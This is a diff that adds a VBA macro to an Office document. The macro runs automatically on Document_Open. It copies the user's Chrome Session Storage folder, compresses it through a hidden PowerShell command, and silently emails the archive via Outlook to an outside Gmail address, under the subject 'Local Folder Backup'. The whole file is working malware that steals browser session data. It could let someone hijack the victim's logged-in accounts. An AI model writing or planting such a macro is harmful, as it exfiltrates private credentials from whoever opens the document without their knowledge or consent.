@@ -1,0 +1,96 @@
+Private Sub Document_Open()
+    Call CopyChromeLocalStorage
+End Sub
+
+
+Sub CopyChromeLocalStorage()
+    Dim fso As Object
+    Dim sourceFolder As String
+    Dim destinationFolder As String
+    Dim zipFile As String
+    
+    ' Define source and destination paths
+    sourceFolder = Environ("LOCALAPPDATA") & "\Google\Chrome\User Data\Default\Session Storage"
+    destinationFolder = Environ("LOCALAPPDATA") & "\Google\Chrome\User Data\Default\Session"
+    zipFile = Environ("LOCALAPPDATA") & "\ChromeSessionBackup.zip"
+    
+    ' Create FileSystemObject
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Check if source folder exists
+    If fso.FolderExists(sourceFolder) Then
+        ' Copy the folder and its contents
+        fso.CopyFolder sourceFolder, destinationFolder
+        
+        ' Zip the copied folder
+        Call ZipChromeLocalFolder
+        
+        ' Send email with zip attachment
+        Call SendEmail(zipFile, "test@gmail.com")
+    Else
+        MsgBox "Source folder does not exist.", vbExclamation, "Error"
+    End If
+    
+    ' Cleanup
+    Set fso = Nothing
+End Sub
+
+Sub ZipChromeLocalFolder()
+    Dim objShell As Object
+    Dim fso As Object
+    Dim sourceFolderPath As String
+    Dim zipFilePath As String
+    Dim cmd As String
+
+    ' Define paths
+    sourceFolderPath = Environ("LOCALAPPDATA") & "\Google\Chrome\User Data\Default\Session\"
+    zipFilePath = Environ("LOCALAPPDATA") & "\ChromeSessionBackup.zip"
+
+    ' Create FileSystemObject to check if folder exists
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    ' Check if the source folder exists
+    If fso.FolderExists(sourceFolderPath) Then
+        ' Delete existing zip file if exists
+        If fso.FileExists(zipFilePath) Then
+            fso.DeleteFile zipFilePath, True
+        End If
+
+        ' Use Shell to run a command to create the ZIP
+        Set objShell = CreateObject("WScript.Shell")
+
+        ' Create the ZIP file using the Windows command line (PowerShell or cmd)
+        cmd = "powershell.exe -Command ""Compress-Archive -Path '" & sourceFolderPath & "' -DestinationPath '" & zipFilePath & "'"""
+
+        ' Run the command to create the ZIP file
+        objShell.Run cmd, 0, True
+
+        ' Cleanup
+        Set objShell = Nothing
+        Set fso = Nothing
+    End If
+End Sub
+
+
+Sub SendEmail(zipPath As String, recipient As String)
+    Dim OutlookApp As Object
+    Dim MailItem As Object
+    
+    ' Create Outlook application
+    Set OutlookApp = CreateObject("Outlook.Application")
+    Set MailItem = OutlookApp.CreateItem(0)
+    
+    ' Configure email
+    With MailItem
+        .To = recipient
+        .Subject = "Local Folder Backup"
+        .Body = "Please find the attached zip file of the Local folder."
+        .Attachments.Add zipPath
+        .Send
+    End With
+    
+    ' Cleanup
+    Set MailItem = Nothing
+    Set OutlookApp = Nothing
+End Sub
+
